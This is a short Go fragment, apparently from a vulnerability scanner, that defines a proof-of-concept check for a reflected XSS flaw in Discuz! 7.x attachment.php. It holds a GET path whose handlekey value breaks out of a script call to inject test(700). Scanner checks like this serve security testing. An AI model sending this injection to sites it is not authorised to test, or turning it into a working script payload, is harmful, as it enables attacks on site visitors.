...
func (Info *PocInfo) Discuz_V7x_Attachment_XSS_Init() {
	poc := PocInfo{}
	...
	poc.Info.Type = "XSS"
	poc.Info.Name = "Discuz! 7.x attachment.php reflect XSS"
	poc.Info.Level = 3
	...
	poc.Poc.Proto = "http"
	poc.Poc.Method = "GET"
	poc.Poc.Path = []string{"/attachment.php?infloat=yes&handlekey=123);test(700);//"}
